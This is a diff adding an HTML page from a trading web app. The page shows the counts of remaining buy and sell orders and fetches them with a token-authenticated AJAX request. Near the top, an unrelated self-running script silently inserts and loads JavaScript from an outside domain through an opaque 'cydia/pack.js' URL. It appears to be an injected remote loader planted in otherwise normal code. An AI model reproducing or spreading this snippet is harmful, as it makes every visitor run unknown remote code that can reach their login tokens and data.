@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0,viewport-fit=cover" name="viewport" />
+		<title>首页</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+      	<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/home/index.css" />
+		<link rel="stylesheet" href="../../static/css/swiper.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+    <header class="weui-bar weui-bar-nav" id="returnBtn">
+        <a class="weui-pull-left weui-btns">
+            <span class="weui-cell__fts"></span>
+        </a>
+        <div class="weui-title">剩余买单卖单统计</div>
+    </header>
+		<div class="weui-tab__b">
+			<div class="personBox assetBox" id="ecmmmmm">
+				<div class="myAssets">
+					<div class="leftassets">
+						<p class="pool">
+							<span>剩余买单</span>
+						</p>
+                        <h2 id="payCount">12</h2>
+					</div>
+					<span></span>
+					<div class="rightassets">
+						<p class="pool">
+							<span>剩余卖单</span>
+						</p>
+						<h2 id="saleCount">12</h2>
+					</div>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/swiper.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script>
+            $.ajax({
+                type:"post",
+                url:host+'/trading/getBrokerStatistics',
+                data:'',
+                dataType:'json',
+                timeout:20000,
+                headers:{'token' : token},
+                success: function (data) {
+                    $("#saleCount").html(data.saleCount);
+                    $("#payCount").html(data.payCount);
+                },
+                error:function(xhr,type,errorThrown){
+                    console.log(xhr.statusText);
+                    console.log("错误提示了："+ xhr.status +" ");
+                    if(xhr.status == 322){
+                        $.toast('请先登录！');
+                        localStorage.removeItem('token');
+                        localStorage.removeItem('userInfo');
+                        localStorage.removeItem('ecmToken');
+                        localStorage.removeItem('ecmUser');
+                        location.href = '/login.html';
+
+                    }else if(xhr.status == 321){
+                        $.toast('账号已被封禁！');
+                        localStorage.removeItem('token');
+                        localStorage.removeItem('userInfo');
+                        location.href = '/login.html';
+                    }
+                    $.hideLoading();
+                }
+            });
+		</script>
+	</body>
+</html>
